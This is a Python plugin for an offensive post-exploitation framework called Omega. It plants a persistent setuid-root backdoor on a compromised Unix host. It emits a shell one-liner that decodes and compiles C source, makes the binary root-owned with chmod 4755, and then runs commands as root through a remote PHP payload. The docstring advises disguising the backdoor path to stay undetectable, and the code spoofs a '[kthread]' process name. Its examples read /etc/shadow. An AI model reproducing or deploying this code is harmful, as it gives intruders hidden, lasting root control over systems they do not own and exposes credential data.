#!/usr/bin/env python3

#            ---------------------------------------------------
#                              Omega Framework                                
#            ---------------------------------------------------
#                  Copyright (C) <2020>  <Entynetproject>       
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

"""Setuid payload handler.

USAGE:
    suidroot --create <payload>
    suidroot <command>

DESCRIPTION:
    Provide a simple way to install persistent setuid(2)
    payload from previously obtained root access.

    SUIDROOT_PAYLOAD file should be carefully chosen to not
    look suspicious. Our goal is to make it as undetectable
    as we can. I recommend searching for legitimate setuid()
    files already installed on the system, and using a
    similar file path as SUIDROOT_PAYLOAD.

LIMITATIONS:
    - Only works on Linux/UNIX.
    - RCE must be available (`run` plugin must work).
    - Current (unprivileged) user must have execution
    rights on payload file.

WARNING:
    Considering Omega's input parser, commands which
    contain quotes, semicolons, and other chars that could be
    interpreted by the framework MUST be quoted to be
    interpreted as a single argument.

    * Bad command:
    # Here, Omega parser detects multiple commands:
    > suidroot echo 'foo bar' > /tmp/foobar; cat /etc/passwd

    * Good command:
    # Here, the whole string is correctly passed to plugin
    > suidroot "echo 'foo bar' > /tmp/foobar; cat /etc/passwd"

EXAMPLES:
    > suidroot --create /tmp/payload
      - Generates the payload to be run as root in order
        to enable persistance through Omega
    > suidroot cat /tmp/shadow
      - Print the /etc/shadow data as root
    > suidroot "whoami; id"
      - Show your current user and id (enjoy!)

ENVIRONMENT:
    * SUIDROOT_PAYLOAD
        The setuid(2) payload file
    * SUIDROOT_PWD
        Current working directory for privileged user
"""

import sys
import os
import base64

from core import encoding

import ui.color
import ui.input

from api import plugin
from api import server
from api import environ

SUIDROOT_ENV_VARS = {"SUIDROOT_PAYLOAD", "SUIDROOT_PWD"}

if environ["PLATFORM"].lower().startswith("win"):
    sys.exit("Plugin available on unix-based platforms only")

if len(plugin.argv) < 2:
    sys.exit(plugin.help)

if plugin.argv[1] == '--create':
    if len(plugin.argv) != 3:
        sys.exit(plugin.help)

    payload_file = server.path.abspath(plugin.argv[2])

    # create the payload that must be run as privileged used.
    # The suidroot payload is then created with suid byte
    # enabled, making tunnel available.
    file = open(os.path.join(plugin.path, "payload.c"), 'rb')
    source_code = encoding.decode(base64.b64encode(file.read()))
    payload = ("echo %b | python -m base64 -d | gcc -o %f -x c -;"
               "chown root %f;"
               "chmod 4755 %f;"
               ).replace('%f', payload_file).replace('%b', source_code)

    # prevent previous configuration override
    if SUIDROOT_ENV_VARS.issubset(set(environ)):
        msg = "suidroot environment variables already set. override them ?"
        if ui.input.Expect(False, skip_interrupt=False)(msg):
            sys.exit("Operation canceled")

    print("[*] In order to use suidroot privileged command execution, "
          "run the following shell payload AS ROOT on the remote system:")
    print(ui.color.colorize("\n", "%Blue", payload, "\n"))

    environ['SUIDROOT_PAYLOAD'] = payload_file
    environ['SUIDROOT_PWD'] = environ['PWD']
    sys.exit()


# On classic command pass, make sure the exploit is activated
for var in SUIDROOT_ENV_VARS:
    msg = "Missing environment variable: %s: Use 'suidroot --create'"
    if var not in environ:
        sys.exit(msg % var)

# build the command to send from given arguments
command = ' '.join(plugin.argv[1:]).strip()
# chdir to SUIDROOT_PWD before
if not command.startswith(";"):
    command = " ; " + command
command = 'cd ' + environ['SUIDROOT_PWD'] + command
# token to make sure new pwd is known
if not command.endswith(";"):
    command += " ; "
command += "echo ; echo suid `pwd` suid"

# build the payload to send the command to run on system
payload = server.payload.Payload("payload.php")
# prepend slashes, so payload can spoof it's name with fake '[kthread]' str
payload['PAYLOAD'] = "/////////" + environ['SUIDROOT_PAYLOAD']
payload['COMMAND'] = repr(command)

print("[v] raw command: %r" % command)

output = payload.send()
lines = output.splitlines()

if not lines:
    sys.exit("No output received")

new_pwd = lines.pop()

try:
    assert new_pwd.startswith("suid ")
    assert new_pwd.endswith(" suid")
    new_pwd = new_pwd[5:-5]
    assert server.path.isabs(new_pwd)
    environ['SUIDROOT_PWD'] = new_pwd
    if lines and not lines[-1]:
        lines.pop(-1)
    for line in lines:
        print(line)
except AssertionError:
    print("[-] Couldn't retrieve new $PWD!")
    print("[*] Raw output:")
    print(output)
    sys.exit(1)